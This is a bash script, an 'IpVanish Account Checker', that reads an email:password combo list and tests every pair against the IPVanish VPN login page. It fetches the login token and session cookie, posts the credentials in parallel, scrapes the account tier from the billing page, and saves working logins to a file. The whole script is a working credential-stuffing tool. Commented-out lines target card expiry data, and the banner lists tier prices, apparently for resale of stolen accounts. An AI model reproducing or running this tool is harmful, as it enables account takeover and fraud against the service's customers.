#!/bin/bash
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
PUTIH='\033[1;37m'
echo -e "\e[38;5;206m"
echo -e "\e[1m"
cat << "EOF"
        ---------------------------------------------------------
                        o   o                    o
                         \ /                     |
                          O    oo o  o o-o  o-o -o-
                         / \  | | |  | |  | |-'  |
                        o   o o-o-o--O o  o o-o  o
                                     |
                                  o--o / IpVanish Account Checker
                                  Rewrite : mtezy
                                  Tier : 1 ~ 1 Month $10.00 USD
                                  Tier : 3 ~ 3 Months $26.99 USD
                                  Tier: 12 ~ 1 Year $77.99 USD
                                  
        ---------------------------------------------------------
 
EOF
 
printf "\e[38;5;50m"
cat << "thanks"
         Thanks : Extreme Crew - ccoocoot ccoocot
                  XAYNET - SGBTeam - Rumah Sakit Jiwa
                  
                  
thanks

IGcheck() {
	cokjancok=$(curl -s "https://account.ipvanish.com/login" -i)
     auth=$(echo "$cokjancok" | grep clientToken | grep -Po '(?<=value=")[^;]*' | cut -d '"' -f1)
 #  fetchCookie=$(echo "$cokjancok" | grep -Po '(?<=Set-Cookie:)[^;]*')
   idCoki=$(echo $cokjancok | grep -Po '(?<=PHPSESSID=)[^;]*')
     login=$(curl -s "https://account.ipvanish.com/login/validate" -i \
     -H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" \
     -H "content-type: application/x-www-form-urlencoded" \
     -H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" \
     -H "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7" \
     -H "cookie: PHPSESSID=${idCoki}" \
     -d "clientToken=${auth}&username=${1}&password=${2}")
     loc=$(echo "$login" | grep -Po '(?<=location:)[^;]*' | tr -d '.')
	if [[ $loc == *"index"* ]]; then
	page=$(curl -s "https://account.ipvanish.com/index.php?t=Billing&c=2" \
	-H "cookie: PHPSESSID=${idCoki}")
	#renewDate=$(echo $page | grep -o '>[^<]*<' | grep -o '[^<>]*')
	#date=$(echo $renewDate | grep -Po '(?<=Date : )[^;]*' | cut -d '&' -f1)
	#ccMonth=$(echo $page | grep -Po '(?<="CCMonth":)[^,]*')
	#ccYear=$(echo $page | grep -Po '(?<="CCYear":)[^,]*')
	tier=$(echo $page | grep -Po '(?<="Tier":)[^,]*')
	printf "${NOCOLOR}[$i/$totalLines]${GREEN} INFO : $1:$2 | Tier: $tier\n"
	echo "$1:$2 Tier: $tier" >> ipvanish.txt
	elif [[ $loc == *"login"* ]]; then
	printf "${NOCOLOR}[$i/$totalLines]${RED}[DIE] => $1:$2${NC} \n"
	else
	printf "${NOCOLOR}[$i/$totalLines]${BLUE}[UNK] => $1:$2${NC} \n"
	fi
  
  
	

printf "\r"
}

echo ""
echo "List In This Directory : "
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    echo "[+] Calculate your mailist file"
    echo "############################"
    totalLines=`grep -c ":" $list`
    echo "There are $totalLines of list."
    echo "############################"
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    itung=0
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
    index=$((itung++))
    if [[ $(expr ${i} % ${itung}) == 0 && $i > 0 ]]; then
    percentage=$((100*$i/$totalLines))
    wait
    fi
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"

        IGcheck "$emailna" "$kontol" "$index" &
    done
    